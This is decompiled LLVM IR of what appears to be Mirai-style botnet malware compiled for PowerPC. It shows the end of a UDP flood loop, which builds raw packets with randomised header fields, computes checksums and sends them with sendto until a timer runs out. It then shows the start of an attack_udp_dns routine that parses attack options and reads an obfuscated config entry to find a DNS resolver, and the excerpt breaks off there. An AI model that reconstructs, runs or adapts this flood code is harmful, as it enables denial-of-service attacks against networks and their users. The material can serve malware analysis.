  %v1_10004f7c = trunc i32 %v0_10004f7c to i8
  %v2_10004f7c = load i32, i32* %r10.global-to-local, align 4
  %v3_10004f7c = add i32 %v2_10004f7c, 9
  %v4_10004f7c = inttoptr i32 %v3_10004f7c to i8*
  store i8 %v1_10004f7c, i8* %v4_10004f7c, align 1
  %v0_10004f80 = load i32, i32* %r8.global-to-local, align 4
  %v1_10004f80 = trunc i32 %v0_10004f80 to i16
  %v2_10004f80 = load i32, i32* %r9.global-to-local, align 4
  %v3_10004f80 = add i32 %v2_10004f80, 4
  %v4_10004f80 = inttoptr i32 %v3_10004f80 to i16*
  store i16 %v1_10004f80, i16* %v4_10004f80, align 2
  %v3_10004f84 = load i32, i32* @global_var_100211e0.76, align 4
  store i32 %v3_10004f84, i32* %r0.global-to-local, align 4
  %v0_10004f88 = load i32, i32* @r29, align 4
  %v1_10004f88 = trunc i32 %v0_10004f88 to i16
  %v2_10004f88 = load i32, i32* %r9.global-to-local, align 4
  %v3_10004f88 = add i32 %v2_10004f88, 2
  %v4_10004f88 = inttoptr i32 %v3_10004f88 to i16*
  store i16 %v1_10004f88, i16* %v4_10004f88, align 2
  %v0_10004f8c = load i32, i32* %r0.global-to-local, align 4
  %v1_10004f8c = load i32, i32* %r10.global-to-local, align 4
  %v2_10004f8c = add i32 %v1_10004f8c, 12
  %v3_10004f8c = inttoptr i32 %v2_10004f8c to i32*
  store i32 %v0_10004f8c, i32* %v3_10004f8c, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v0_10004f94 = load i32, i32* %r11.global-to-local, align 4
  %v1_10004f94 = add i32 %v0_10004f94, 16
  %v2_10004f94 = inttoptr i32 %v1_10004f94 to i32*
  %v3_10004f94 = load i32, i32* %v2_10004f94, align 4
  store i32 %v3_10004f94, i32* %r9.global-to-local, align 4
  %v1_10004f98 = load i32, i32* %r10.global-to-local, align 4
  %v2_10004f98 = add i32 %v1_10004f98, 28
  %v3_10004f98 = inttoptr i32 %v2_10004f98 to i32*
  store i32 -1, i32* %v3_10004f98, align 4
  %v0_10004f9c = load i32, i32* %r9.global-to-local, align 4
  %v1_10004f9c = load i32, i32* %r10.global-to-local, align 4
  %v2_10004f9c = add i32 %v1_10004f9c, 16
  %v3_10004f9c = inttoptr i32 %v2_10004f9c to i32*
  store i32 %v0_10004f9c, i32* %v3_10004f9c, align 4
  %v3_10004fa0 = load i32, i32* %stack_var_-84, align 4
  store i32 %v3_10004fa0, i32* %r5.global-to-local, align 4
  store i32 268455848, i32* @lr, align 4
  %v3_10004fa4 = call i32 @util_memcpy(i32 %v3_10004fa0, i32 %v0_10004f14, i32 %v3_10004fa0)
  store i32 %v3_10004fa4, i32* %r3.global-to-local, align 4
  %v3_10004fa8 = load i32, i32* %stack_var_-88, align 4
  store i32 %v3_10004fa8, i32* %r9.global-to-local, align 4
  %v1_10004fac = add i32 %v3_10004fa8, 1
  store i32 %v1_10004fac, i32* %r31.global-to-local, align 4
  %v1_10004fb0 = load i32, i32* @r24, align 4
  %v2_10004fb0 = icmp slt i32 %v1_10004fac, %v1_10004fb0
  %v4_10004fb0 = icmp eq i32 %v1_10004fac, %v1_10004fb0
  store i1 %v4_10004fb0, i1* %cr7_eq.global-to-local, align 1
  store i32 %v1_10004fac, i32* %stack_var_-88, align 4
  br i1 %v2_10004fb0, label %dec_label_pc_10004f00, label %dec_label_pc_10004fbc.loopexit

dec_label_pc_10004fbc.loopexit:                   ; preds = %dec_label_pc_10004f74
  %v0_10004fc4.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_10004fbc

dec_label_pc_10004fbc:                            ; preds = %dec_label_pc_10004fbc.loopexit, %dec_label_pc_10004ed4
  %v0_10004fc4 = phi i32 [ %v0_10004fc4.pre, %dec_label_pc_10004fbc.loopexit ], [ %v1_10004eec, %dec_label_pc_10004ed4 ]
  store i32 65535, i32* %r0.global-to-local, align 4
  %v4_10004fc4 = icmp eq i32 %v0_10004fc4, 65535
  store i1 %v4_10004fc4, i1* %cr2_eq.global-to-local, align 1
  %v0_10004fc8 = load i32, i32* @r27, align 4
  %v4_10004fc8 = icmp eq i32 %v0_10004fc8, 65535
  store i1 %v4_10004fc8, i1* %cr3_eq.global-to-local, align 1
  %v0_10004fcc = load i32, i32* @r28, align 4
  %v4_10004fcc = icmp eq i32 %v0_10004fcc, 65535
  store i1 %v4_10004fcc, i1* %cr4_eq.global-to-local, align 1
  br label %dec_label_pc_10004fd0

dec_label_pc_10004fd0:                            ; preds = %dec_label_pc_10005094, %dec_label_pc_10004fbc
  %v0_10004fd0 = load i32, i32* %r19.global-to-local, align 4
  %v1_10004fd0 = mul i32 %v0_10004fd0, 16
  %v2_10004fd0 = udiv i32 %v0_10004fd0, 268435456
  %v3_10004fd0 = or i32 %v2_10004fd0, %v1_10004fd0
  store i32 %v3_10004fd0, i32* %r19.global-to-local, align 4
  %v1_10004fd4 = call %0 @__asm_mtcrf(i32 1, i32 %v3_10004fd0)
  %v1_10004fd8 = mul nuw i32 %v2_10004fd0, 268435456
  %v2_10004fd8 = urem i32 %v0_10004fd0, 268435456
  %v3_10004fd8 = or i32 %v1_10004fd8, %v2_10004fd8
  store i32 %v3_10004fd8, i32* %r19.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %stack_var_-88, align 4
  %v0_10004fe4 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10004fe4, label %dec_label_pc_10005094, label %dec_label_pc_10004fe8

dec_label_pc_10004fe8:                            ; preds = %dec_label_pc_10004fd0
  store i32 0, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10004fec

dec_label_pc_10004fec:                            ; preds = %dec_label_pc_1000501c, %dec_label_pc_10004fe8
  %v0_10004fec = phi i32 [ %v1_10005084, %dec_label_pc_1000501c ], [ 0, %dec_label_pc_10004fe8 ]
  %v1_10004fec = mul i32 %v0_10004fec, 24
  store i32 %v1_10004fec, i32* %r0.global-to-local, align 4
  %v1_10004ff0 = mul i32 %v0_10004fec, 4
  store i32 %v1_10004ff0, i32* %r11.global-to-local, align 4
  %v1_10004ff4 = load i32, i32* @r25, align 4
  %v2_10004ff4 = add i32 %v1_10004ff4, %v1_10004ff0
  %v3_10004ff4 = inttoptr i32 %v2_10004ff4 to i32*
  %v4_10004ff4 = load i32, i32* %v3_10004ff4, align 4
  store i32 %v4_10004ff4, i32* %r28.global-to-local, align 4
  store i32 0, i32* %r31.global-to-local, align 4
  %v1_10004ffc = load i32, i32* @r30, align 4
  %v2_10004ffc = add i32 %v1_10004ffc, %v1_10004fec
  store i32 %v2_10004ffc, i32* %r10.global-to-local, align 4
  %v1_10005000 = add i32 %v2_10004ffc, 20
  %v2_10005000 = inttoptr i32 %v1_10005000 to i8*
  %v3_10005000 = load i8, i8* %v2_10005000, align 1
  %v4_10005000 = zext i8 %v3_10005000 to i32
  store i32 %v4_10005000, i32* %r9.global-to-local, align 4
  %v1_10005004 = add i32 %v4_10004ff4, 20
  store i32 %v1_10005004, i32* %r27.global-to-local, align 4
  %v3_10005008 = icmp eq i8 %v3_10005000, 31
  store i1 %v3_10005008, i1* %cr7_eq.global-to-local, align 1
  %tmp27 = icmp ult i8 %v3_10005000, 32
  br i1 %tmp27, label %dec_label_pc_10005100, label %dec_label_pc_10005010

dec_label_pc_10005010:                            ; preds = %dec_label_pc_10004fec
  %v0_10005010 = load i1, i1* %cr3_eq.global-to-local, align 1
  br i1 %v0_10005010, label %dec_label_pc_10005144, label %dec_label_pc_10005014

dec_label_pc_10005014:                            ; preds = %dec_label_pc_10005100, %dec_label_pc_10005010
  %v0_10005014 = load i1, i1* %cr4_eq.global-to-local, align 1
  br i1 %v0_10005014, label %dec_label_pc_1000512c, label %dec_label_pc_10005018

dec_label_pc_10005018:                            ; preds = %dec_label_pc_10005144, %dec_label_pc_10005014
  %v0_10005018 = load i1, i1* %cr2_eq.global-to-local, align 1
  br i1 %v0_10005018, label %dec_label_pc_10005138, label %dec_label_pc_1000501c

dec_label_pc_1000501c:                            ; preds = %dec_label_pc_1000512c, %dec_label_pc_10005018, %dec_label_pc_10005138
  %v0_1000501c = load i32, i32* %r31.global-to-local, align 4
  %v1_1000501c = trunc i32 %v0_1000501c to i16
  %v2_1000501c = load i32, i32* %r28.global-to-local, align 4
  %v3_1000501c = add i32 %v2_1000501c, 10
  %v4_1000501c = inttoptr i32 %v3_1000501c to i16*
  store i16 %v1_1000501c, i16* %v4_1000501c, align 2
  %v0_10005024 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10005024, i32* @r3, align 4
  %v2_10005028 = call i32 @checksum_generic(i32 %v0_10005024, i32 20)
  %v3_10005028 = trunc i32 %v2_10005028 to i16
  store i32 %v2_10005028, i32* %r3.global-to-local, align 4
  %v3_1000502c = load i32, i32* %stack_var_-84, align 4
  store i32 %v3_1000502c, i32* %r6.global-to-local, align 4
  %v3_10005030 = load i32, i32* %r28.global-to-local, align 4
  %v4_10005030 = add i32 %v3_10005030, 10
  %v5_10005030 = inttoptr i32 %v4_10005030 to i16*
  store i16 %v3_10005028, i16* %v5_10005030, align 2
  %v0_10005034 = load i32, i32* %r27.global-to-local, align 4
  store i32 %v0_10005034, i32* @r4, align 4
  %v0_10005038 = load i32, i32* %r31.global-to-local, align 4
  %v1_10005038 = trunc i32 %v0_10005038 to i16
  %v3_10005038 = add i32 %v0_10005034, 6
  %v4_10005038 = inttoptr i32 %v3_10005038 to i16*
  store i16 %v1_10005038, i16* %v4_10005038, align 2
  %v0_1000503c = load i32, i32* %r6.global-to-local, align 4
  %v1_1000503c = add i32 %v0_1000503c, 12
  store i32 %v1_1000503c, i32* %r6.global-to-local, align 4
  %v0_10005040 = load i32, i32* %r27.global-to-local, align 4
  %v1_10005040 = add i32 %v0_10005040, 4
  %v2_10005040 = inttoptr i32 %v1_10005040 to i16*
  %v3_10005040 = load i16, i16* %v2_10005040, align 2
  %v4_10005040 = zext i16 %v3_10005040 to i32
  store i32 %v4_10005040, i32* %r5.global-to-local, align 4
  %v0_10005044 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10005044, i32* %r3.global-to-local, align 4
  %v4_10005048 = call i32 @checksum_tcpudp(i32 %v0_10005044, i32 %v0_10005034, i32 %v4_10005040, i32 %v1_1000503c)
  %v5_10005048 = trunc i32 %v4_10005048 to i16
  store i32 %v4_10005048, i32* %r3.global-to-local, align 4
  %v3_1000504c = load i32, i32* %stack_var_-88, align 4
  store i32 %v3_1000504c, i32* %r7.global-to-local, align 4
  %v0_10005050 = load i32, i32* %r27.global-to-local, align 4
  %v1_10005050 = add i32 %v0_10005050, 2
  %v2_10005050 = inttoptr i32 %v1_10005050 to i16*
  %v3_10005050 = load i16, i16* %v2_10005050, align 2
  %v4_10005050 = zext i16 %v3_10005050 to i32
  store i32 %v4_10005050, i32* %r0.global-to-local, align 4
  %v0_10005054 = load i32, i32* %r28.global-to-local, align 4
  %v1_10005058 = mul i32 %v3_1000504c, 24
  store i32 %v1_10005058, i32* %r7.global-to-local, align 4
  %v3_1000505c = load i32, i32* %stack_var_-84, align 4
  store i32 %v3_1000505c, i32* %r5.global-to-local, align 4
  %v4_10005060 = add i32 %v0_10005050, 6
  %v5_10005060 = inttoptr i32 %v4_10005060 to i16*
  store i16 %v5_10005048, i16* %v5_10005060, align 2
  store i32 16384, i32* %r6.global-to-local, align 4
  %v0_10005068 = load i32, i32* %r7.global-to-local, align 4
  %v1_10005068 = load i32, i32* @r30, align 4
  %v2_10005068 = add i32 %v1_10005068, %v0_10005068
  store i32 %v2_10005068, i32* %r7.global-to-local, align 4
  %v0_1000506c = load i32, i32* %r5.global-to-local, align 4
  %v1_1000506c = add i32 %v0_1000506c, 32
  store i32 %v1_1000506c, i32* %r5.global-to-local, align 4
  %v0_10005070 = load i32, i32* %r0.global-to-local, align 4
  %v1_10005070 = trunc i32 %v0_10005070 to i16
  %v3_10005070 = add i32 %v2_10005068, 2
  %v4_10005070 = inttoptr i32 %v3_10005070 to i16*
  store i16 %v1_10005070, i16* %v4_10005070, align 2
  %v0_10005074 = load i32, i32* @r26, align 4
  store i32 %v0_10005074, i32* %r3.global-to-local, align 4
  store i32 16, i32* %r8.global-to-local, align 4
  store i32 268456064, i32* @lr, align 4
  %v6_1000507c = call i32 @__libc_sendto(i32 %v0_10005074, i32 %v0_10005054, i32 %v1_1000506c, i32 16384, i32 %v2_10005068, i32 16)
  store i32 %v6_1000507c, i32* %r3.global-to-local, align 4
  %v3_10005080 = load i32, i32* %stack_var_-88, align 4
  %v1_10005084 = add i32 %v3_10005080, 1
  store i32 %v1_10005084, i32* %r9.global-to-local, align 4
  %v1_10005088 = load i32, i32* @r24, align 4
  %v2_10005088 = icmp slt i32 %v1_10005084, %v1_10005088
  %v4_10005088 = icmp eq i32 %v1_10005084, %v1_10005088
  store i1 %v4_10005088, i1* %cr7_eq.global-to-local, align 1
  store i32 %v1_10005084, i32* %stack_var_-88, align 4
  br i1 %v2_10005088, label %dec_label_pc_10004fec, label %dec_label_pc_10005094

dec_label_pc_10005094:                            ; preds = %dec_label_pc_1000501c, %dec_label_pc_10004fd0
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_10005098 = call i32 @__GI_time()
  store i32 %v0_10005098, i32* %r3.global-to-local, align 4
  %v0_1000509c = load i32, i32* %r17.global-to-local, align 4
  %v2_1000509c = icmp slt i32 %v0_1000509c, %v0_10005098
  %v4_1000509c = icmp eq i32 %v0_1000509c, %v0_10005098
  store i1 %v4_1000509c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_1000509c, label %dec_label_pc_100050a4, label %dec_label_pc_10004fd0

dec_label_pc_100050a4:                            ; preds = %dec_label_pc_10005094, %entry, %dec_label_pc_10005154
  store i32 %v0_10004d7c, i32* %r0.global-to-local, align 4
  %v1_100050b8 = call %0 @__asm_mtcrf(i32 56, i32 %v0_10004d58)
  store i32 %v0_10004d6c, i32* %r27.global-to-local, align 4
  store i32 %v0_10004da8, i32* %r28.global-to-local, align 4
  store i32 %v0_10004db0, i32* %r29.global-to-local, align 4
  store i32 %v0_10004dc0, i32* %r31.global-to-local, align 4
  %v0_100050fc = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_100050fc

dec_label_pc_10005100:                            ; preds = %dec_label_pc_10004fec
  %v1_10005100 = add i32 %v2_10004ffc, 16
  %v2_10005100 = inttoptr i32 %v1_10005100 to i32*
  %v3_10005100 = load i32, i32* %v2_10005100, align 4
  store i32 %v3_10005100, i32* %r29.global-to-local, align 4
  %v0_10005104 = call i32 @rand_next()
  store i32 %v0_10005104, i32* %r3.global-to-local, align 4
  %v3_10005108 = load i32, i32* %stack_var_-88, align 4
  %v1_1000510c = mul i32 %v3_10005108, 24
  %v1_10005110 = load i32, i32* @r30, align 4
  %v2_10005110 = add i32 %v1_10005110, %v1_1000510c
  store i32 %v2_10005110, i32* %r9.global-to-local, align 4
  %v1_10005114 = add i32 %v2_10005110, 20
  %v2_10005114 = inttoptr i32 %v1_10005114 to i8*
  %v3_10005114 = load i8, i8* %v2_10005114, align 1
  %v4_10005114 = zext i8 %v3_10005114 to i32
  store i32 %v4_10005114, i32* %r0.global-to-local, align 4
  %tmp28 = urem i8 %v3_10005114, 64
  %v2_10005118 = zext i8 %tmp28 to i32
  %v3_10005118 = lshr i32 %v0_10005104, %v2_10005118
  %v1_1000511c = load i32, i32* %r29.global-to-local, align 4
  %v2_1000511c = add i32 %v3_10005118, %v1_1000511c
  store i32 %v2_1000511c, i32* %r3.global-to-local, align 4
  %v1_10005120 = load i32, i32* %r28.global-to-local, align 4
  %v2_10005120 = add i32 %v1_10005120, 16
  %v3_10005120 = inttoptr i32 %v2_10005120 to i32*
  store i32 %v2_1000511c, i32* %v3_10005120, align 4
  %v0_10005124 = load i1, i1* %cr3_eq.global-to-local, align 1
  br i1 %v0_10005124, label %dec_label_pc_10005144, label %dec_label_pc_10005014

dec_label_pc_1000512c:                            ; preds = %dec_label_pc_10005144, %dec_label_pc_10005014
  %v0_1000512c = call i32 @rand_next()
  %v1_1000512c = trunc i32 %v0_1000512c to i16
  store i32 %v0_1000512c, i32* %r3.global-to-local, align 4
  %v3_10005130 = load i32, i32* %r28.global-to-local, align 4
  %v4_10005130 = add i32 %v3_10005130, 20
  %v5_10005130 = inttoptr i32 %v4_10005130 to i16*
  store i16 %v1_1000512c, i16* %v5_10005130, align 2
  %v0_10005134 = load i1, i1* %cr2_eq.global-to-local, align 1
  br i1 %v0_10005134, label %dec_label_pc_10005138, label %dec_label_pc_1000501c

dec_label_pc_10005138:                            ; preds = %dec_label_pc_1000512c, %dec_label_pc_10005018
  %v0_10005138 = call i32 @rand_next()
  %v1_10005138 = trunc i32 %v0_10005138 to i16
  store i32 %v0_10005138, i32* %r3.global-to-local, align 4
  %v3_1000513c = load i32, i32* %r27.global-to-local, align 4
  %v4_1000513c = add i32 %v3_1000513c, 2
  %v5_1000513c = inttoptr i32 %v4_1000513c to i16*
  store i16 %v1_10005138, i16* %v5_1000513c, align 2
  br label %dec_label_pc_1000501c

dec_label_pc_10005144:                            ; preds = %dec_label_pc_10005100, %dec_label_pc_10005010
  %v0_10005144 = call i32 @rand_next()
  %v1_10005144 = trunc i32 %v0_10005144 to i16
  store i32 %v0_10005144, i32* %r3.global-to-local, align 4
  %v3_10005148 = load i32, i32* %r28.global-to-local, align 4
  %v4_10005148 = add i32 %v3_10005148, 4
  %v5_10005148 = inttoptr i32 %v4_10005148 to i16*
  store i16 %v1_10005144, i16* %v5_10005148, align 2
  %v0_1000514c = load i1, i1* %cr4_eq.global-to-local, align 1
  br i1 %v0_1000514c, label %dec_label_pc_1000512c, label %dec_label_pc_10005018

dec_label_pc_10005154:                            ; preds = %dec_label_pc_10004eb0
  %v0_10005154 = load i32, i32* @r26, align 4
  store i32 %v0_10005154, i32* @r3, align 4
  %v0_10005158 = call i32 @__GI___libc_close()
  store i32 %v0_10005158, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100050a4

; uselistorder directives
  uselistorder i32 %v0_10005144, { 1, 0 }
  uselistorder i32 %v0_10005138, { 1, 0 }
  uselistorder i32 %v0_1000512c, { 1, 0 }
  uselistorder i32 %v0_10005098, { 1, 0, 2 }
  uselistorder i32 %v1_10005084, { 0, 3, 2, 4, 1 }
  uselistorder i32 %v4_10005048, { 1, 0 }
  uselistorder i32 %v2_10005028, { 1, 0 }
  uselistorder i32 %v1_10004ff0, { 1, 0 }
  uselistorder i32 %v0_10004fd0, { 2, 1, 0 }
  uselistorder i32 %v1_10004fac, { 0, 2, 1, 3 }
  uselistorder i32 %v4_10004f24, { 0, 2, 1, 3 }
  uselistorder i32 %v1_10004f20, { 1, 0 }
  uselistorder i32 %v1_10004f10, { 1, 0 }
  uselistorder i32 %v1_10004eec, { 1, 0 }
  uselistorder i32* %stack_var_-84, { 1, 2, 3, 0, 4 }
  uselistorder i32* %stack_var_-88, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10 }
  uselistorder i32* %r7.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32* %r6.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 9, 8, 10, 11, 12, 13, 0 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 6, 7, 20, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 0, 19, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 1 }
  uselistorder i32* %r28.global-to-local, { 1, 2, 3, 0, 4, 5, 6, 7, 8, 9 }
  uselistorder i32* %r27.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32* %r10.global-to-local, { 0, 2, 3, 4, 5, 1, 6, 7, 8, 9, 10, 11 }
  uselistorder i1* %cr7_eq.global-to-local, { 0, 1, 2, 4, 3, 5, 6, 7, 8 }
  uselistorder i8 31, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 10, 11 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_100050a4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000501c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10004f74, { 1, 0 }
}

define i32 @attack_udp_dns(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %cr2_eq.global-to-local = alloca i1, align 1
  %cr3_eq.global-to-local = alloca i1, align 1
  %cr4_eq.global-to-local = alloca i1, align 1
  %cr4_lt.global-to-local = alloca i1, align 1
  %cr7_eq.global-to-local = alloca i1, align 1
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r14.global-to-local = alloca i32, align 4
  %r15.global-to-local = alloca i32, align 4
  %r16.global-to-local = alloca i32, align 4
  %r17.global-to-local = alloca i32, align 4
  %r18.global-to-local = alloca i32, align 4
  %r19.global-to-local = alloca i32, align 4
  %r20.global-to-local = alloca i32, align 4
  %r24.global-to-local = alloca i32, align 4
  %r25.global-to-local = alloca i32, align 4
  %r27.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg5, i32* %r7.global-to-local, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_-2196 = alloca i32, align 4
  %stack_var_-2200 = alloca i32, align 4
  %stack_var_-2164 = alloca i32, align 4
  %v0_10005160 = load i32, i32* @lr, align 4
  store i32 %v0_10005160, i32* %r0.global-to-local, align 4
  %v0_10005168 = call i32 @__asm_mfcr()
  store i32 %arg2, i32* %r20.global-to-local, align 4
  store i32 %v0_10005168, i32* @r23, align 4
  %v0_1000517c = load i32, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %stack_var_-2200, align 4
  store i32 %arg3, i32* %r19.global-to-local, align 4
  %v0_100051b0 = load i32, i32* @r24, align 4
  %v0_100051b4 = load i32, i32* @r25, align 4
  store i32 %arg5, i32* @r28, align 4
  %v0_100051cc = load i32, i32* @r31, align 4
  %v0_100051d8 = load i32, i32* @r27, align 4
  %v0_100051dc = load i32, i32* @r30, align 4
  store i32 268456420, i32* @lr, align 4
  %v2_100051e0 = call i32 @calloc(i32 %arg2, i32 4)
  store i32 %v2_100051e0, i32* @r21, align 4
  %v0_100051e8 = load i32, i32* @r28, align 4
  %v0_100051f4 = load i32, i32* @r29, align 4
  store i32 %v0_100051f4, i32* %r3.global-to-local, align 4
  store i32 268456444, i32* @lr, align 4
  %v4_100051f8 = inttoptr i32 %v0_100051e8 to i32*
  %v5_100051f8 = call i32 @attack_get_opt_int(i32 %v0_100051f4, i32* %v4_100051f8, i32 2, i32 0)
  %v5_10005208 = trunc i32 %v5_100051f8 to i8
  %v0_10005210 = load i32, i32* @r28, align 4
  %v0_10005214 = load i32, i32* @r29, align 4
  store i32 %v0_10005214, i32* %r3.global-to-local, align 4
  store i32 268456476, i32* @lr, align 4
  %v4_10005218 = inttoptr i32 %v0_10005210 to i32*
  %v5_10005218 = call i32 @attack_get_opt_int(i32 %v0_10005214, i32* %v4_10005218, i32 3, i32 65535)
  %v0_1000521c = load i32, i32* @r28, align 4
  store i32 %v5_10005218, i32* %r16.global-to-local, align 4
  %v0_1000522c = load i32, i32* @r29, align 4
  store i32 %v0_1000522c, i32* %r3.global-to-local, align 4
  store i32 268456500, i32* @lr, align 4
  %v4_10005230 = inttoptr i32 %v0_1000521c to i32*
  %v5_10005230 = call i32 @attack_get_opt_int(i32 %v0_1000522c, i32* %v4_10005230, i32 4, i32 64)
  %v0_10005234 = load i32, i32* @r28, align 4
  %v5_10005240 = trunc i32 %v5_10005230 to i8
  %v0_10005248 = load i32, i32* @r29, align 4
  store i32 %v0_10005248, i32* %r3.global-to-local, align 4
  store i32 268456528, i32* @lr, align 4
  %v4_1000524c = inttoptr i32 %v0_10005234 to i32*
  %v5_1000524c = call i32 @attack_get_opt_int(i32 %v0_10005248, i32* %v4_1000524c, i32 5, i32 0)
  %v0_1000525c = load i32, i32* @r28, align 4
  %v1_10005260 = urem i32 %v5_1000524c, 256
  store i32 %v1_10005260, i32* %r14.global-to-local, align 4
  %v0_10005264 = load i32, i32* @r29, align 4
  store i32 %v0_10005264, i32* %r3.global-to-local, align 4
  store i32 268456556, i32* @lr, align 4
  %v4_10005268 = inttoptr i32 %v0_1000525c to i32*
  %v5_10005268 = call i32 @attack_get_opt_int(i32 %v0_10005264, i32* %v4_10005268, i32 6, i32 65535)
  %v0_1000526c = load i32, i32* @r28, align 4
  store i32 %v5_10005268, i32* %r17.global-to-local, align 4
  %v0_1000527c = load i32, i32* @r29, align 4
  store i32 %v0_1000527c, i32* %r3.global-to-local, align 4
  store i32 268456580, i32* @lr, align 4
  %v4_10005280 = inttoptr i32 %v0_1000526c to i32*
  %v5_10005280 = call i32 @attack_get_opt_int(i32 %v0_1000527c, i32* %v4_10005280, i32 7, i32 53)
  %v0_10005288 = load i32, i32* @r28, align 4
  store i32 %v5_10005280, i32* %r18.global-to-local, align 4
  %v0_10005298 = load i32, i32* @r29, align 4
  store i32 %v0_10005298, i32* %r3.global-to-local, align 4
  store i32 268456608, i32* @lr, align 4
  %v4_1000529c = inttoptr i32 %v0_10005288 to i32*
  %v5_1000529c = call i32 @attack_get_opt_int(i32 %v0_10005298, i32* %v4_1000529c, i32 9, i32 65535)
  %v0_100052a0 = load i32, i32* @r28, align 4
  store i32 %v5_1000529c, i32* %r24.global-to-local, align 4
  %v0_100052b0 = load i32, i32* @r29, align 4
  store i32 %v0_100052b0, i32* %r3.global-to-local, align 4
  store i32 268456632, i32* @lr, align 4
  %v4_100052b4 = inttoptr i32 %v0_100052a0 to i32*
  %v5_100052b4 = call i32 @attack_get_opt_int(i32 %v0_100052b0, i32* %v4_100052b4, i32 0, i32 12)
  %v0_100052c0 = load i32, i32* @r28, align 4
  store i32 %v5_100052b4, i32* %r25.global-to-local, align 4
  %v0_100052c8 = load i32, i32* @r29, align 4
  store i32 %v0_100052c8, i32* %r3.global-to-local, align 4
  store i32 268456656, i32* @lr, align 4
  %v4_100052cc = inttoptr i32 %v0_100052c0 to i32*
  %v5_100052cc = call i32 @attack_get_opt_str(i32 %v0_100052c8, i32* %v4_100052cc, i32 8, i32 0)
  store i32 %v5_100052cc, i32* @r26, align 4
  store i32 37, i32* %r3.global-to-local, align 4
  store i32 268456668, i32* @lr, align 4
  %v1_100052d8 = call i32 @table_unlock_val(i32 37)
  store i32 37, i32* %r3.global-to-local, align 4
  %v3_100052e4 = call i32 @table_retrieve_val(i32 37, i32* null)
  store i32 %v3_100052e4, i32* @r3, align 4
  %v2_100052f0 = call i32 @__libc_open(i32 %v3_100052e4, i32 0)
  store i32 %v2_100052f0, i32* %r31.global-to-local, align 4
  store i32 37, i32* %r3.global-to-local, align 4
  store i32 268456704, i32* @lr, align 4
  %v1_100052fc = call i32 @table_lock_val(i32 37)
  store i32 %v1_100052fc, i32* %r3.global-to-local, align 4
  %v1_10005300 = icmp slt i32 %v2_100052f0, 0
  %v3_10005300 = icmp eq i32 %v2_100052f0, 0
  store i1 %v3_10005300, i1* %cr7_eq.global-to-local, align 1
  br i1 %v1_10005300, label %dec_label_pc_100053d0, label %dec_label_pc_10005308

dec_label_pc_10005308:                            ; preds = %entry
  %v2_10005308 = ptrtoint i32* %stack_var_-2164 to i32
  store i32 %v2_10005308, i32* %r27.global-to-local, align 4
  store i32 %v2_100052f0, i32* @r3, align 4
  %v1_10005318 = call i32 @__libc_read(i32 %v2_100052f0)
  store i32 %v1_10005318, i32* %r30.global-to-local, align 4
  %v0_10005320 = load i32, i32* %r31.global-to-local, align 4
  store i32 %v0_10005320, i32* @r3, align 4
  %v0_10005324 = call i32 @__GI___libc_close()
  store i32 38, i32* %r3.global-to-local, align 4
  store i32 268456752, i32* @lr, align 4
  %v1_1000532c = call i32 @table_unlock_val(i32 38)
  store i32 38, i32* %r3.global-to-local, align 4
  %v3_10005338 = call i32 @table_retrieve_val(i32 38, i32* null)
  %v0_1000533c = load i32, i32* %r30.global-to-local, align 4
  store i32 %v2_10005308, i32* %r3.global-to-local, align 4
  %v3_10005348 = bitcast i32* %stack_var_-2164 to i8*
  %v4_10005348 = call i32 @util_stristr(i8* %v3_10005348, i32 %v0_1000533c, i32 %v3_10005338)
  store i32 %v4_10005348, i32* @r31, align 4
  store i32 38, i32* %r3.global-to-local, align 4
  store i32 268456792, i32* @lr, align 4
  %v1_10005354 = call i32 @table_lock_val(i32 38)
  store i32 %v1_10005354, i32* %r3.global-to-local, align 4
  %v0_10005358 = load i32, i32* @r31, align 4
  %v3_10005358 = icmp eq i32 %v0_10005358, -1
  store i1 %v3_10005358, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10005358, label %dec_label_pc_100053d0, label %dec_label_pc_10005360

dec_label_pc_10005360:                            ; preds = %dec_label_pc_10005308
  %v0_10005360 = load i32, i32* %r30.global-to-local, align 4
  %v3_10005360 = icmp sgt i32 %v0_10005360, %v0_10005358
  %v4_10005360 = icmp eq i32 %v0_10005360, %v0_10005358
  store i1 %v4_10005360, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10005360, label %dec_label_pc_10005368, label %dec_label_pc_100053d0

